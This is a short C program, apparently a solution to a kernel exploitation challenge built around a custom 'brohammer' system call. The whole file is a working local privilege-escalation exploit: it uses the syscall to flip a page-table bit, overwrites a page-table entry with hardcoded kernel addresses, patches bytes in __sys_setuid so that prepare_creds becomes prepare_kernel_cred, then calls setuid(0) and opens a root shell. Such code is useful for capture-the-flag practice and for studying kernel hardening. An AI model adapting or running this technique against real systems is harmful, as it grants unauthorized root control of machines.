#include <stdio.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define __NR_BROHAMMER 333

int main() {

	int ret = syscall(__NR_BROHAMMER, 0xffff8800018fb060, 2);
	printf("ret is %d\n", ret);
	
	*(unsigned long*)0xffff8800018fb040 = 0x80000000010001e7;


	// Patch JMP in __sys_setuid
	*(unsigned char*)0xffff88000102c8ac = 0xeb;
	*(unsigned char*)0xffff88000102c8ad = 0x4f;

	// Patch prepare_creds -> prepare_kernel_cred
	*(unsigned char*)0xffff88000102c89b = 0x6f;
	*(unsigned char*)0xffff88000102c89c = 0x84;
	
	//pause()
	getchar();

	setuid(0);

	printf("My UID is %d\n", getuid());

	system("/bin/sh");

	return 0;
}
